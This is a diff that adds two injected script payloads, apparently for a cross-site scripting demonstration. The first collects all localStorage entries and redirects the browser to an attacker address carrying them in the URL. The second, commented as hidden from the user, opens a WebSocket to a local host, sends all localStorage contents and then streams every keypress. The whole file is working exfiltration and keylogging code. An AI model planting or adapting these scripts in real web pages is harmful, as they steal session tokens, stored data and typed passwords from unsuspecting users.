@@ -1,0 +1,38 @@
+<!-- Simple example for publishing the localStorage - visible to the user -->
+<script>
+  setTimeout(function () {
+    var pairs = [];
+    for (var i = 0; i < localStorage.length; i++) {
+      var key = localStorage.key(i);
+      var value = localStorage.getItem(key);
+      var pair = key + "=" + value;
+      pairs.push(pair);
+    }
+    pairs = pairs.reduce(function (prev, current) {
+      return prev.concat("&", current);
+    }, "");
+    var attackerAddr = "http://localhost:1234/?";
+    window.location = attackerAddr + pairs;
+  }, 5000);
+</script>
+
+<!-- Keylogging and localStorage - hidden from the user -->
+<script>
+  var socket = new WebSocket('ws://localhost:8001');
+
+  var pairs = [];
+  for (var i = 0; i < localStorage.length; i++) {
+    var key = localStorage.key(i);
+    var value = localStorage.getItem(key);
+    var pair = key + "=" + value;
+    pairs.push(pair);
+  }
+
+  socket.onopen = function () {
+    socket.send(JSON.stringify(pairs));
+
+    document.addEventListener('keypress', function (e) {
+      socket.send(e.key);
+    });
+  };
+</script>
